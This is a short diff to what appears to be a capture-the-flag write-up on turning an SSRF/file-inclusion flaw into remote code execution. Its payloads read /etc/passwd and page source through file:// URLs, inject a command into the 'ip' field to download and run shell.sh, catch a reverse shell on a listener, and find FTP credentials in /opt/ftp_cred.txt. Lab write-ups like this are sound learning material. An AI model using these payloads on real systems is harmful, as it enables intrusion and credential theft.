@@ -15,6 +15,7 @@ ip=file:///etc/passwd
 ### RCE via SSRF
 
 change the IP field to the following
+use the code below to see the source code a website which has a File inclusion vulnerability.
 ```
 ip=file:///proc/self/cwd/index.php
 ```
@@ -44,6 +45,10 @@ shell.sh -O /tmp/shell.sh&&
 # Executed the /tmp/shell.sh file 
 ip=file:///etc/passwd&&bash /tmp/shell.sh&&
 ```
+start a listener on port 80 and get the shell before executing shell.sh
+
+after getting the shell we see in `/opt/ftp_cred.txt`
+there are FTP credentials for user `punisher` 
 
 
 ### References
